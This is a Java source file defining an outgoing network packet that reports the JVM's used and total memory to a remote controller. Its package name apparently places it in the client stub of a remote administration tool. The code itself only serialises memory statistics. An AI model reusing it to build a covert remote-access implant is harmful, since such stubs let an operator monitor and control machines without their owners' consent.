package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet24JVMMemory extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		Runtime rt = Runtime.getRuntime();
		long usedMB = (rt.totalMemory() - rt.freeMemory()) / 1024L / 1024L;
		long totalMB = rt.totalMemory() / 1024L / 1024L;
		
		dos.writeLong(usedMB);
		dos.writeLong(totalMB);
	}

	@Override
	public byte getPacketId() {
		return 24;
	}

}
